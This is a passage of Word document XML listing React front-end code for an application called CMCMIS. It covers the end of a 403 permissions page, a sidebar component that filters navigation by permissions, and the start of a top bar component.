                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;ShieldOff size={40} strokeWidth={1.5} className="mx-auto text-danger mb-4" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;h1 className="text-xl font-semibold text-ink"&gt;403 — Insufficient permissions&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;p className="mt-2 text-sm text-ink-soft"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          You are signed in as &lt;span className="font-medium text-ink"&gt;{user?.sub ?? 'anonymous'}&lt;/span&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          {user?.role ? &lt;&gt; ({user.role})&lt;/&gt; : null}, but this page requires the permission:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        {requiredPermission ? (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;code className="inline-block mt-2 px-2 py-1 rounded bg-base-elev text-xs text-ink-soft"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            {requiredPermission}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;/code&gt;) : null}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;div className="mt-6 flex items-center justify-center gap-2"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;Link to="/dashboard"&gt;&lt;Button variant="primary"&gt;Back to dashboard&lt;/Button&gt;&lt;/Link&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;Button variant="ghost" onClick={logout}&gt;Sign out&lt;/Button&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/main&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.3  Sidebar.jsx — Permission-Filtered Nav</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src/components/Sidebar.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { NavLink, useNavigate } from 'react-router-dom';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { LogOut } from 'lucide-react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Brand } from './Brand.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Badge } from './ui/Badge.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Button } from './ui/Button.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { useAuth } from '../lib/auth-context.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { visibleNavItems } from '../lib/permissions.js';</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export function Sidebar() {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const { user, logout } = useAuth();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const navigate = useNavigate();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!user) return null;</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const items = visibleNavItems(user.permissions);</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async function handleSignOut() { await logout(); navigate('/login', { replace: true }); }</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return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;aside className="w-64 shrink-0 min-h-screen flex flex-col bg-base-elev border-r border-border"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="px-5 py-5 border-b border-border"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;Brand size="md" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;div className="mt-4"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;div className="text-sm font-medium text-ink"&gt;{user.sub}&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;div className="mt-1"&gt;&lt;Badge color="badge"&gt;{user.role}&lt;/Badge&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;nav className="flex-1 p-3 space-y-1 overflow-y-auto"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        {items.map(item =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          const Icon = item.icon;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;NavLink key={item.to} to={item.to}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              end={item.to === '/dashboard'}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              className={({ isActive }) =&gt; clsx(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                'flex items-center gap-2.5 px-3 py-2 rounded-md text-sm transition-colors',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                isActive ? 'bg-accent text-white font-medium'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                         : 'text-ink hover:bg-base hover:text-accent')}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              &lt;Icon size={18} strokeWidth={1.5} /&gt;{item.label}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;/NavLink&gt;);</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&lt;/nav&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="p-3 border-t border-border"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;Button variant="ghost" className="w-full justify-start" onClick={handleSignOut}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;LogOut size={16} strokeWidth={1.5} /&gt;Sign out</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/Button&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/aside&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.4  TopBar.jsx — Auto-Derived Page Title + Avatar</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src/components/TopBar.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { useLocation } from 'react-router-dom';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { useAuth } from '../lib/auth-context.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Badge } from './ui/Badge.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { ALL_NAV_ITEMS } from '../lib/permissions.js';</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function initialsOf(sub) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!sub) return '··';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return sub.slice(0, 2).toUpperCase();</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export function TopBar({ title }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const { user } = useAuth();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const location = useLocation();</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const derived = ALL_NAV_ITEMS.find(n =&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    n.to === '/dashboard'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      ? location.pathname === '/dashboard'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      : location.pathname.startsWith(n.to));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const resolvedTitle = title || derived?.label || 'CMCMIS';</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return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;header className="h-14 shrink-0 flex items-center justify-between px-6 bg-white border-b border-border"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;h1 className="text-sm font-semibold text-ink"&gt;{resolvedTitle}&lt;/h1&gt;</w:t>
